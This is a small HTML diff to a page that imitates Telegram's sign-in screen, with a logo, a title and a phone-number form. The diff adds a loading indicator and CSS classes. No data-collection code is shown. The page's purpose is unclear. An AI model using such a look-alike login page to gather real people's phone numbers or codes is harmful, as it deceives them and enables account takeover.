@@ -1,4 +1,4 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -7,16 +7,20 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+    <!-- Loading Indicator -->
+    <div id="loadingIndicator">Loading...</div>
+
     <!-- Login Section -->
     <div class="login-container" id="loginContainer">
         <img id="telegramLogo" src="telegram-logo.png" alt="Telegram Logo" class="logo">
-        <h2>Sign in to Telegram</h2>
-        <p>Please confirm your country code and enter your phone number.</p>
+        <h2 class="title">Sign in to Telegram</h2>
+        <p class="confirmation-message">Please confirm your country code and enter your phone number.</p>
         <form id="phoneForm">
             <div class="input-container">
                 <div class="input-label">Country</div>
                 <select id="country" name="country">
                     <option value="GB">United Kingdom (+44)</option>
+                    <!-- Add other country options here as needed -->
                 </select>
             </div>
             <div class="input-container">
